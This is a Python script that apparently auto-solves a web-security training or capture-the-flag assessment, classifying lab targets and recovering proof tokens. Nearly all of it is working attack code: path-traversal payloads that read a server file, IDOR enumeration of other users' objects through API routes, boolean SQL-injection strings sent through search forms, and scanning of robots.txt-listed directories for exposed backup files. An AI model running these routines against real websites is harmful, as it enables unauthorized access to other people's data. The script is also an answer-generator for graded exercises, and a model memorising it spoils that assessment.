#!/usr/bin/env python3
"""Solve every independently classified target in the current mastery assignment."""
from concurrent.futures import ThreadPoolExecutor
from html.parser import HTMLParser
import json
from pathlib import Path
import re
import urllib.parse

from solve import PROOF_RE, Target, recover_update_proof


class Links(HTMLParser):
    def __init__(self):
        super().__init__()
        self.hrefs = []

    def handle_starttag(self, tag, attrs):
        if tag == "a":
            for key, value in attrs:
                if key == "href" and value:
                    self.hrefs.append(value)


def rec_backup(target):
    status, robots = target.request("/robots.txt", save="robots")
    if status != 200:
        return None
    for directory in re.findall(r"(?mi)^\s*Disallow:\s*(\S+)", robots):
        directory = "/" + directory.strip("/") + "/"
        status, index = target.request(
            directory, save="index" + directory.replace("/", "_"))
        if status != 200:
            continue
        parser = Links()
        parser.feed(index)
        members = [href for href in parser.hrefs
                   if href.rstrip("/").split("/")[-1]]
        members.sort(key=lambda href: 0 if re.search(
            r"\.(bak|old|orig|save|swp|zip|tar|gz|sql|json|txt|env)(\.|$)",
            href, re.I) else 1)
        for href in members:
            route = href if href.startswith("/") else directory + href
            status, body = target.request(
                route, save="file_" + route.strip("/").replace("/", "_"))
            match = PROOF_RE.search(body)
            if status == 200 and match:
                return match.group(0)
    return None


def rec_lfi(target, html):
    link = re.search(r'href="([^"]*\.php)\?(\w+)=', html)
    if not link:
        return None
    endpoint, parameter = link.group(1), link.group(2)
    objective = "/run/huntress/objective.txt"
    relative = objective.lstrip("/")
    for depth in range(1, 9):
        payload = "../" * depth + relative
        route = f"{endpoint}?{urllib.parse.urlencode({parameter: payload})}"
        status, body = target.request(route, save=f"lfi-{depth}")
        match = PROOF_RE.search(body)
        if match:
            return match.group(0)
    route = f"{endpoint}?{urllib.parse.urlencode({parameter: objective})}"
    status, body = target.request(route, save="lfi-absolute")
    match = PROOF_RE.search(body)
    return match.group(0) if match else None


def rec_idor(target, html):
    feed = next(iter(re.findall(r'href="(/api/[^"]+)"', html)), None)
    case_links = re.findall(r'href="(/[a-z]+/\d+)"', html)
    if not feed or not case_links:
        return None
    own_ids = {int(link.rsplit("/", 1)[1]) for link in case_links}
    status, case_page = target.request(case_links[0], save="own-object")
    api_template = None
    inline = re.search(
        r'fetch\(["\'](/api/[^"\']*?)(\d+)([^"\']*)["\']', case_page)
    if inline:
        api_template = (inline.group(1), inline.group(3))
    status, feed_body = target.request(feed, save="activity-feed")
    try:
        feed_json = json.loads(feed_body)
    except ValueError:
        return None
    current_user = feed_json.get("current_user")
    foreign_ids = []
    for event in feed_json.get("events", []):
        object_id = event.get("case_id") or event.get("id")
        if object_id is None:
            continue
        if ((event.get("owner") and event.get("owner") != current_user)
                or event.get("visibility") == "reference_only"
                or object_id not in own_ids):
            foreign_ids.append(object_id)
    for object_id in dict.fromkeys(foreign_ids):
        if api_template:
            routes = [f"{api_template[0]}{object_id}{api_template[1]}"]
        else:
            kind = case_links[0].rsplit("/", 2)[-2]
            routes = [f"/api/{kind}/{object_id}"]
        for route in routes:
            status, body = target.request(route, save=f"foreign-object-{object_id}")
            match = PROOF_RE.search(body)
            if status == 200 and match:
                return match.group(0)
    return None


def rec_sqli(target, html):
    action_match = re.search(r"<form[^>]*action=['\"]([^'\"]+)['\"]", html)
    name_match = re.search(r"<input[^>]*name=['\"]([^'\"]+)['\"]", html)
    if not action_match or not name_match:
        return None
    action, name = action_match.group(1), name_match.group(1)
    payloads = ("') OR ('1'='1", "%' OR '1'='1",
                "') OR ('1'='1'-- -", "' OR '1'='1")
    for number, payload in enumerate(payloads):
        route = f"{action}?{urllib.parse.urlencode({name: payload})}"
        status, body = target.request(route, save=f"sqli-{number}")
        match = PROOF_RE.search(body)
        if match:
            return match.group(0)
    return None


def classify_and_recover(target):
    status, html = target.request("/", save="root")
    if status != 200:
        return None, "root request failed"
    status, clues_body = target.request("/api/clues", save="clues")
    clues = None
    if status == 200:
        try:
            clues = json.loads(clues_body)
        except ValueError:
            pass
    if clues and clues.get("update_feed") and clues.get("update_policy"):
        return recover_update_proof(target), "unverified dependency update"
    if re.search(r'href="[^"]*\.php\?\w+=', html):
        return rec_lfi(target, html), "LFI path traversal"
    if (re.search(r'href="(/api/[^"]+)"', html)
            and re.findall(r'href="(/[a-z]+/\d+)"', html)):
        return rec_idor(target, html), "IDOR"
    if re.search(r"<form[^>]*action=['\"][^'\"]*(search|lookup|explore)",
                 html, re.I):
        return rec_sqli(target, html), "group-closing boolean SQLi"
    if re.search(r"crawler polic|robots", html, re.I):
        return rec_backup(target), "backup exposure"
    proof = rec_backup(target)
    if proof:
        return proof, "backup exposure (fallback)"
    if "<form" in html:
        return rec_sqli(target, html), "group-closing boolean SQLi (fallback)"
    return None, "unclassified"


def main():
    mode_dir = Path(__file__).resolve().parent / "mastery"
    start = json.loads((mode_dir / "start.json").read_text())
    targets = {item["id"]: item["url"] for item in start["targets"]}

    def solve(question):
        target_id = question["artifact"]
        evidence_dir = mode_dir / "evidence" / target_id.replace(" ", "-")
        target = Target(targets[target_id], evidence_dir)
        proof, classification = classify_and_recover(target)
        (evidence_dir / "classification.json").write_text(json.dumps({
            "target": target_id, "classification": classification,
            "proof_recovered": bool(proof)}, indent=2) + "\n")
        return question["id"], proof, classification

    with ThreadPoolExecutor(max_workers=len(start["questions"])) as executor:
        results = list(executor.map(solve, start["questions"]))
    answers = {}
    for answer_id, proof, classification in results:
        print(f"{answer_id}: {classification}: {proof or 'NOT RECOVERED'}")
        if proof:
            answers[answer_id] = proof
    (mode_dir / "answers.json").write_text(json.dumps(answers, indent=2) + "\n")
    if len(answers) != len(start["questions"]):
        raise SystemExit("not every mastery proof was recovered; answers.json is partial")


if __name__ == "__main__":
    main()
